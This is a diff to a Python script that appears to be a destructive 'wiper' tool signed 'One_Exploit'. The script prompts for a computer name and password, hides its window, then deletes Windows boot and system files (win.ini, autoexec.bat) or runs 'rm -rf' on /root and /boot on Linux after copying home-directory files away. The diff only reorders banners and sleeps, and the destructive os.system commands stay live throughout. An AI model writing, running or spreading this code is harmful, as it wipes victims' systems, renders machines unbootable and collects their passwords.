@@ -31,7 +31,7 @@ def run():
             time.sleep(1)
             os.system('cls')
             print('''
-                        w                     w  iiiiii    n           n
+                        w                     w  iiiiiiii  n           n
                          w         w         w      ii     n n         n
                           w       w w       w       ii     n   n       n
                            w     w   w     w        ii     n     n     n
@@ -45,6 +45,9 @@ def run():
             password = input('your system have password?(Y , n) : ').lower()
             if password == 'Y':
                 passnamesystem = getpass('Inter password '+namesystem+" : ")
+                print('=============================')
+                print('    YOU DELET ALL SYSTEM    |')
+                print('=============================')
                 print(f'usename: {namesystem}')
                 print(f'password: {passnamesystem}')
                 time.sleep(1)
@@ -58,13 +61,10 @@ def run():
                 os.system('del C:\\ntidr')
                 os.system('attrib -r -g -h C:\windows\win.ini')
                 os.system('del C:\windows\win.ini')
-                print('=============================')
-                print('    YOU DELET ALL SYSTEM    |')
-                print('=============================')
             else:
                 print(f'usename: {namesystem}')
                 print('password: ')
-                time.sleep(1)
+                time.sleep(2)
                 win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                 os.system('off')
                 os.system('attrib -r -g -h C:\autoexec.bat')
@@ -94,14 +94,17 @@ def run():
                     ll          ii      n         n n
                     ll ll ll  iiiiii    n           n
             ''')
-
             namesystem = input('Plese inter the name your pc: ')
             password = input('your system have password?(Y , n) : ').lower()
             if password == 'y':
                 passnamesystem = getpass('Inter password '+namesystem+" : ")
+                print('=============================')
+                print('    YOU DELET ALL SYSTEM    |')
+                print('=============================')
+                print('We are One_Exploit')
                 print(f'usename: {namesystem}')
                 print(f'pass: {passnamesystem}')
-                time.sleep(1)
+                time.sleep(2)
                 win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                 os.system('sudo su')
                 os.system('echo '+passnamesystem)
@@ -110,15 +113,15 @@ def run():
                 os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                 os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                 os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
+
+            else:
                 print('=============================')
                 print('    YOU DELET ALL SYSTEM    |')
                 print('=============================')
                 print('We are One_Exploit')
-
-            else:
                 print(f'usename: {namesystem}')
                 print('password: ')
-                time.sleep(1)
+                time.sleep(2)
                 win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                 os.system('sudo su')
                 os.system('cp -r /home/'+namesystem+'/* /techer0221/')
@@ -126,10 +129,6 @@ def run():
                 os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                 os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                 os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
-                print('=============================')
-                print('    YOU DELET ALL SYSTEM    |')
-                print('=============================')
-                print('We are One_Exploit')
         delLinux()
 
     elif sys == '3':    
@@ -141,5 +140,4 @@ def run():
     elif sys == '99':
         exits()
 
-run()  
-    
+run()
